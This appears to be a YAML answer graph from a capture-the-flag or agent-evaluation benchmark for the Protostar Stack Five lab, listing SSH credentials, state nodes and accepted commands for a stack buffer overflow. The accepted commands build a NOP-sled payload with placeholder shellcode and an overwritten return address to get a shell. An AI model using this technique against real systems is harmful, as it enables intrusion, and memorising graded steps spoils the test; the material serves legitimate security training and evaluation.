version: '0.5'
graph:
  type: reference
challenge:
  id: protostar_stack5
  name: Protostar Stack Five
  description: Inject shellcode through the stack buffer and redirect execution to it to obtain a shell.
attacker_context:
  user: user
  access:
    method: ssh
    credentials:
      username: user
      password: user
  target:
    host: <target-hostname-or-ip>
    port: 22
goal:
  node: node3
irrelevant_commands:
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- man
- strings
- checksec
- file
- ls
- ls -la
- env
- printenv
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: Saved EIP offset identified
- id: node1
  type: state
  label: Shellcode payload prepared
- id: node2
  type: state
  label: Return target into stack buffer identified
- id: node3
  type: state
  label: Interactive shell obtained
edges:
- id: edge0
  from: start
  to: node0
  action: find_saved_eip_offset
  accepted_commands:
  - gdb -q /opt/protostar/bin/stack5
  - python -c 'print "A"*76 + "BBBB"' > /tmp/stack5.in
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: .*
- id: edge1
  from: node0
  to: node1
  action: prepare_nopsled_and_shellcode
  accepted_commands:
  - python -c 'print "\x90"*32 + "<shellcode>" + "A"*(76-32-len("<shellcode>"))' > /tmp/stack5.in
  transition_match:
    exit_code: 0
    stdout_regex: ^$
    stderr_regex: ^$
- id: edge2
  from: node1
  to: node2
  action: identify_stack_return_target
  accepted_commands:
  - gdb -q /opt/protostar/bin/stack5
  - env -i /opt/protostar/bin/stack5
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: .*
- id: edge3
  from: node2
  to: node3
  action: redirect_execution_to_shellcode
  accepted_commands:
  - python -c 'import struct; shell="\x90"*32 + "<shellcode>" + "A"*(76-32-len("<shellcode>")); print shell + struct.pack("<I", 0xbffff730)' | /opt/protostar/bin/stack5
  transition_match:
    exit_code: 0
    stdout_regex: .*(sh-|[$#]).*
    stderr_regex: .*
